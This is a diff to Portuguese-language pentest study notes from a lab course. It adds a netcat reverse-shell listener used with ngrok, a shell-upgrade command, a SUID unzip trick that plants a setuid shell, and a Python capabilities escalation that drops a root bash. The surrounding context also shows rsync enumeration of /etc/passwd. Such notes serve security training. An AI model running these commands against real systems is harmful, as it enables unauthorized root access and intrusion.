@@ -4520,6 +4520,7 @@ O comando faz um dump na tabela do banco passado, de todos os campos, podendo se
 Diferença entre Shells -> interativa e não interativa
 
     python -c 'import pty; pty.spawn("/bin/bash")'
+    script -qc /bin/bash /dev/null
 
 Para pegar uma shel mais interativa.
 
@@ -6977,7 +6978,7 @@ Outros padrões e frameworks de PenTest `NIST OSSTMM ISSAF PTES MITRE`
 
 `Acordo do nivel de serviço` Mensuração do serviço definida e remediação ou penalidades devem ser acordadas. Service Level Agreement - SLA
 
-- PRATICA
+- PRATICA Anotação do [Thiago Muniz](ygoralberto.github.io/pentest+notes-prof/)
 
 Alguns comando passados de forma prática usando o laboratório da acadi
 
@@ -7000,6 +7001,27 @@ Fazer uma busca e enumeraçã no redis
 	nmap -Pn 192.168.200.44 --script --rsync-list-modules
 	rsync --list-only rsync://192.168.200.44/backup/etc/passwd
  	rsync --chavzP --stats rsync://192.168.200.44/backup/etc/passwd/ .
+
+Vulnerabilidade de command Injection
+
+Ao tentar realizar uma shell reversa 
+	
+ 	nc -vnlp -s 127.0.0.1
+	
+Esse comando quando usado com o NGROK serve para forçar a conexão localhost que é onde a ferramenta funciona.
+
+	script -qc /bin/bash /dev/null
+
+Shell mais interativa
+
+Note: Quando der erro da biblioteca "GLIBC" do unzip no gtfobins SUID, na maquina alvo `cp /bin/sh .` joga o arquivo sh para o atacante `chmod +sx sh` depois `zip shell.zip sh` joga o arquivo para o alvo e `./unzip -K shell.zip`.
+
+Capabilities são funções especiais para arquivos, usuários, kernel etc. COmo se fosse uma GPO para dar poderes especiais dentro do sistema específico. Exemplo abaixo, com o python
+
+	getcap -r /usr/
+	python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+O primeiro lista as capabilities que existem no sistema, o segundo executa o python pois estava listado no capabilities, troca o UID do usuário para 0 (que é o root) e drop a shell.
 
 .
 .
